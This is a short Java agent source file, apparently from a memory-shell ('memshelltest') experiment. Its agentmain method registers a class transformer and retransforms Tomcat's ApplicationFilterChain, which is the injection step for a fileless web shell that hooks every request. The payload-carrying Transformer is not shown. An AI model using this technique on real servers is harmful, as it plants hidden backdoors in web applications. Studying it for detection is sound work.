package priv.memshelltest;

import java.lang.instrument.Instrumentation;

public class Agent {
    public static void agentmain(String agentArgs, Instrumentation inst){
        inst.addTransformer(new Transformer(),true);
        System.out.println("Agent Main Done");

        Class[] loadedClasses =inst.getAllLoadedClasses();
        System.out.println("all classes that was  been load:"+loadedClasses);
        for (Class c:loadedClasses){
//            System.out.println(c.getName());
            //筛选需要重新加载的类
            if (c.getName().equals("org.apache.catalina.core.ApplicationFilterChain")){
                try {
                    inst.retransformClasses(c);
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}
